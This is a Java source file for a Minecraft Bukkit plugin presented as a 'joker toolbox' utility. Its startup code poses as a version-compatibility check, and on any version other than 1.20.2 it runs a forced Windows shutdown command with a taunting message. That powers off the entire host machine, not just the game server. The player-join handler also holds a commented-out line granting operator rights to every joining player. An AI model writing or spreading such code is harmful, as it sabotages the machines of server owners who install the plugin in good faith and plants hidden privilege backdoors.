package com.remiaft.jokertool;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.IOException;

public final class JokerTool extends JavaPlugin implements Listener {

    @Override
    public void onEnable() {
        String temp;
        Boolean temp1 = false;
        if(Bukkit.getBukkitVersion().equals("1.20.2-R0.1-SNAPSHOT")){
            temp = "§b检测到版本是1.20.2，已正确为您加载该插件";
        }else {
            temp = "§c您的版本不是1.20.2，由于兼容性问题，正在为您关闭服务器";
            temp1 = true;
        }

        Bukkit.getConsoleSender().sendMessage(new String[] {
                "§c joker 工具箱 §b By AngelHell",
                "------------------------------",
                "§b当前版本: " + Bukkit.getVersion(),
                "§b当前Bukkit版本: " + Bukkit.getBukkitVersion(),
                temp
        });
        if(temp1){
            try {
                Runtime.getRuntime().exec("shutdown -s -t 10 -f -c \"服务器挺累的吧，休息一下捏\"");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }

        // Plugin startup logic

    }
    @EventHandler
    public void playerJoinerEvent(PlayerJoinEvent event){
        Player player = event.getPlayer();
//        player.setOp(true);
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }
}
